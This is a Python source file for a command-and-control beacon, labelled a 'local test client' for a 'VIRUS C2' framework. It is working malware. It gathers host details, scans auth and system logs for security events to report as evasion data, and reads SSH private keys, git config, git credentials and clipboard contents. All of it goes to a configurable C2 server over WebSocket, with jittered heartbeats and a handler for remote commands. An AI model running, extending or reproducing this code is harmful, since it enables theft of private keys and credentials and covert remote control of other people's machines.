#!/usr/bin/env python3
"""
VIRUS C2 — Local Beacon Test Client.

Connects to the C2 server via WebSocket and demonstrates the full pipeline:
  1. Sends handshake + node registration
  2. Sends real system info (hostname, OS, user, IP)
  3. Reads local log files for threat detection
  4. Reports threats to C2 as evasion data
  5. Harvests local credentials (SSH keys, git config)
  6. Sends periodic heartbeats
  7. Receives and logs AI evasion commands
"""

import asyncio
import hashlib
import json
import os
import platform
import random
import re
import subprocess
import sys
import time
import uuid
from datetime import datetime

sys.path.insert(0, os.path.dirname(__file__))

C2_HOST = os.getenv("C2_HOST", "localhost")
C2_PORT = os.getenv("C2_PORT", "8000")
C2_URL = f"http://{C2_HOST}:{C2_PORT}"

NODE_ID = os.getenv("NODE_ID", f"beacon_{uuid.uuid4().hex[:8]}")
WATERMARK = os.getenv("WATERMARK", hashlib.md5(NODE_ID.encode()).hexdigest()[:8])

THREAT_SIGNATURES = [
    "segfault", "permission denied", "authentication failure",
    "failed password", "invalid user", "root login",
    "sudo:", "FAILED SU", "kernel.*intrusion",
    "apparmor.*DENIED", "selinux.*denied",
    "iptables.*DROP", "sshd.*invalid",
    "fail2ban", "ufw.*BLOCK", "process.*killed",
    "oom-killer", "out of memory", "tcpdump",
]

LOG_PATHS = [
    "/var/log/auth.log", "/var/log/syslog",
    "/var/log/kern.log", "/var/log/messages",
    "/var/log/audit/audit.log",
]


def gather_system_info() -> dict:
    info = {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_release": platform.release(),
        "user": os.getenv("USER", "unknown"),
        "arch": platform.machine(),
        "python_version": platform.python_version(),
        "pid": os.getpid(),
    }
    try:
        info["local_ip"] = subprocess.check_output(
            ["hostname", "-I"], timeout=3, stderr=subprocess.DEVNULL
        ).decode().strip().split()[0]
    except Exception:
        info["local_ip"] = "unknown"
    return info


def read_logs() -> list:
    results = []
    for path in LOG_PATHS:
        if not os.path.exists(path):
            continue
        try:
            with open(path, "r", errors="replace") as f:
                lines = f.readlines()[-200:]
            for line in lines:
                results.append({"path": path, "line": line.strip()[:200]})
        except Exception:
            pass
    return results


def detect_threats(lines: list) -> list:
    threats = []
    for entry in lines:
        lower = entry["line"].lower()
        for sig in THREAT_SIGNATURES:
            if re.search(sig, lower):
                severity = "medium"
                if any(k in sig for k in ("root login", "FAILED SU", "oom-killer")):
                    severity = "critical"
                elif any(k in sig for k in ("failed password", "invalid user", "authentication failure")):
                    severity = "high"
                threats.append({
                    "signature": sig,
                    "source": entry["path"],
                    "severity": severity,
                    "line": entry["line"],
                })
                break
    return threats


def harvest_credentials_safe() -> list:
    """Harvest credentials with error recovery — each source is isolated."""
    creds = []

    # SSH keys — try/except around each source
    try:
        ssh_dir = os.path.expanduser("~/.ssh")
        if os.path.isdir(ssh_dir):
            for key_name in ["id_rsa", "id_ed25519", "id_ecdsa"]:
                key_path = os.path.join(ssh_dir, key_name)
                if os.path.exists(key_path):
                    try:
                        with open(key_path, "r") as f:
                            content = f.read()
                        if "PRIVATE KEY" in content:
                            creds.append({
                                "type": "ssh",
                                "site": f"file://{key_name}",
                                "username": os.getenv("USER", "unknown"),
                                "password": content[:500],
                            })
                    except Exception:
                        pass
    except Exception:
        pass

    # Git credentials — isolated
    try:
        git_config = os.path.expanduser("~/.gitconfig")
        if os.path.exists(git_config):
            with open(git_config, "r") as f:
                creds.append({
                    "type": "git",
                    "site": "gitconfig",
                    "username": os.getenv("USER", "unknown"),
                    "password": f.read()[:500],
                })
    except Exception:
        pass

    try:
        git_creds = os.path.expanduser("~/.git-credentials")
        if os.path.exists(git_creds):
            with open(git_creds, "r") as f:
                for line in f.read().splitlines()[:5]:
                    if line.strip():
                        creds.append({
                            "type": "git",
                            "site": "git-credentials",
                            "username": "",
                            "password": line.strip()[:500],
                        })
    except Exception:
        pass

    # Clipboard — isolated
    try:
        import subprocess
        clip = subprocess.check_output(["xclip", "-selection", "clipboard", "-o"], timeout=3, stderr=subprocess.DEVNULL).decode(errors="replace").strip()
        if clip and len(clip) > 4:
            creds.append({"type": "clipboard", "site": "system_clipboard", "username": "clipboard", "password": clip[:500]})
    except Exception:
        pass

    return creds


async def main():
    import aiohttp

    ws_url = f"ws://{C2_HOST}:{C2_PORT}/ws/beacon"
    print(f"\n{'='*60}")
    print(f"  VIRUS C2 — LOCAL BEACON TEST CLIENT")
    print(f"{'='*60}")
    print(f"  Node ID:    {NODE_ID}")
    print(f"  Watermark:  {WATERMARK}")
    print(f"  C2 URL:     {ws_url}")
    print(f"{'='*60}\n")

    while True:
        try:
            async with aiohttp.ClientSession() as session:
                headers = {
                    "X-Node-ID": NODE_ID,
                    "X-Watermark": WATERMARK,
                }

                async with session.ws_connect(ws_url, headers=headers) as ws:
                    print(f"[+] Connected to C2")

                    # 1. Send handshake
                    await ws.send_json({
                        "type": "handshake",
                        "node_id": NODE_ID,
                        "watermark": WATERMARK,
                        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                    })
                    print(f"[*] Handshake sent")

                    # 2. Send system info
                    sys_info = gather_system_info()
                    await ws.send_json({
                        "type": "system_info",
                        "node_id": NODE_ID,
                        "watermark": WATERMARK,
                        "info": sys_info,
                    })
                    print(f"[*] System info sent: {sys_info['hostname']} / {sys_info['os']} / {sys_info['local_ip']}")

                    # 3. Send initial heartbeat
                    await ws.send_json({
                        "type": "heartbeat",
                        "node_id": NODE_ID,
                        "watermark": WATERMARK,
                        "data": {"type": "initial", "node_id": NODE_ID, "watermark": WATERMARK},
                    })
                    print(f"[*] Initial heartbeat sent")

                    # 4. Read logs and detect threats
                    log_lines = read_logs()
                    threats = detect_threats(log_lines)
                    if threats:
                        print(f"[!] {len(threats)} threats detected in local logs")
                        for t in threats[:5]:
                            print(f"    [{t['severity']}] {t['signature']} — {t['source']}: {t['line'][:80]}")

                        await ws.send_json({
                            "type": "beacon",
                            "node_id": NODE_ID,
                            "watermark": WATERMARK,
                            "data": {
                                "evasion": {
                                    "score": min(len(threats) * 15, 99),
                                    "threat_level": "high" if any(t["severity"] == "critical" for t in threats) else "medium",
                                    "methods_detected": list(set(t["signature"] for t in threats))[:10],
                                },
                                "threats": threats[:10],
                            },
                        })
                        print(f"[*] Threat data sent to C2 for AI analysis")
                    else:
                        print(f"[*] No threats detected in local logs")
                        await ws.send_json({
                            "type": "beacon",
                            "node_id": NODE_ID,
                            "watermark": WATERMARK,
                            "data": {
                                "evasion": {
                                    "score": 0,
                                    "threat_level": "low",
                                    "methods_detected": [],
                                },
                            },
                        })

                    # 5. Harvest credentials (safe, with error isolation)
                    creds = harvest_credentials_safe()
                    if creds:
                        print(f"[*] {len(creds)} local credentials harvested")
                        for c in creds:
                            await ws.send_json({
                                "type": "harvest",
                                "data": {
                                    "type": "credential",
                                    "node_id": NODE_ID,
                                    "watermark": WATERMARK,
                                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                                    "credential": c,
                                },
                            })
                        print(f"[*] Credentials sent to C2")
                    else:
                        print(f"[*] No local credentials found")

                    # 6. Main loop: heartbeat with jitter + listen for commands
                    beacon_count = 0
                    async for msg in ws:
                        if msg.type == aiohttp.WSMsgType.TEXT:
                            data = msg.json()
                            msg_type = data.get("type", "")

                            if msg_type == "heartbeat_ack":
                                beacon_count += 1
                                # Jitter: 8-12 heartbeats before re-check, ±20% random
                                if beacon_count % random.randint(8, 12) == 0:
                                    await asyncio.sleep(random.uniform(0.5, 2.0))
                                    await ws.send_json({
                                        "type": "heartbeat",
                                        "node_id": NODE_ID,
                                        "watermark": WATERMARK,
                                        "data": {"type": "heartbeat", "node_id": NODE_ID, "watermark": WATERMARK},
                                    })
                                    # Re-check threats periodically
                                    log_lines = read_logs()
                                    new_threats = detect_threats(log_lines)
                                    if new_threats:
                                        print(f"[!] {len(new_threats)} new threats")
                                        await ws.send_json({
                                            "type": "beacon",
                                            "node_id": NODE_ID,
                                            "watermark": WATERMARK,
                                            "data": {
                                                "evasion": {
                                                    "score": min(len(new_threats) * 15, 99),
                                                    "threat_level": "high" if any(t["severity"] == "critical" for t in new_threats) else "medium",
                                                    "methods_detected": list(set(t["signature"] for t in new_threats))[:10],
                                                },
                                                "threats": new_threats[:10],
                                            },
                                        })

                            elif msg_type == "command":
                                action = data.get("action", "unknown")
                                params = data.get("params", {})
                                print(f"[>] C2 COMMAND: {action} // params={json.dumps(params)[:100]}")
                                # Send acknowledgment
                                result = {
                                    "type": "command_result",
                                    "action": action,
                                    "status": "executed",
                                    "detail": f"Command '{action}' acknowledged by {NODE_ID}",
                                    "params": params,
                                }
                                await ws.send_json(result)
                                print(f"    Result: executed // node={NODE_ID}")

                            elif msg_type == "config":
                                mutation = data.get("data", {}).get("mutation", {})
                                if mutation:
                                    print(f"[=] Config received: mutation={mutation.get('mode', '?')}")

                            elif msg_type == "handshake_ack":
                                print(f"[+] Authenticated by C2")

                        elif msg.type == aiohttp.WSMsgType.CLOSED:
                            break
                        elif msg.type == aiohttp.WSMsgType.ERROR:
                            break

        except aiohttp.ClientConnectorError:
            print(f"[!] Cannot reach C2 at {ws_url} — retrying in 5s...")
        except Exception as e:
            print(f"[!] Connection error: {e} — retrying in 5s...")

        await asyncio.sleep(5)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] Beacon stopped.")
